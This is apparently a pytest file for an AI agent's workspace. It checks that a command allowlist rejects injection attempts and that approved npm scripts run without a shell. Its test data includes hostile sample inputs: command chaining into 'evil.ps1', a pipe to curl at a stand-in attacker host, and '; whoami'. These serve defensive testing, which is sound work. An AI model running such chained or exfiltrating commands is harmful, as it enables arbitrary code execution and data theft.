from pathlib import Path
from unittest.mock import patch

import pytest

from web_palace_agent.workspace import Workspace


@pytest.mark.parametrize(
    "command",
    [
        "npm.cmd run build && powershell.exe evil.ps1",
        "npm.cmd run build | curl attacker.invalid",
        "npm.cmd run build; whoami",
        "powershell.exe -File script.ps1",
        "node -e process.exit()",
    ],
)
def test_command_boundary_rejects_injection_and_arbitrary_executables(tmp_path: Path, command: str):
    workspace = Workspace(tmp_path, [command])

    with pytest.raises(ValueError):
        workspace.validate_commands([command])


def test_approved_package_script_runs_without_a_shell(tmp_path: Path):
    workspace = Workspace(tmp_path, ["npm.cmd run build"])

    with patch("web_palace_agent.workspace.subprocess.run") as run:
        run.return_value.returncode = 0
        run.return_value.stdout = "built"
        run.return_value.stderr = ""
        result = workspace.run_approved(["npm.cmd run build"])

    run.assert_called_once_with(
        ["npm.cmd", "run", "build"],
        cwd=tmp_path.resolve(),
        shell=False,
        capture_output=True,
        text=True,
        timeout=120,
    )
    assert result[0]["exit_code"] == 0
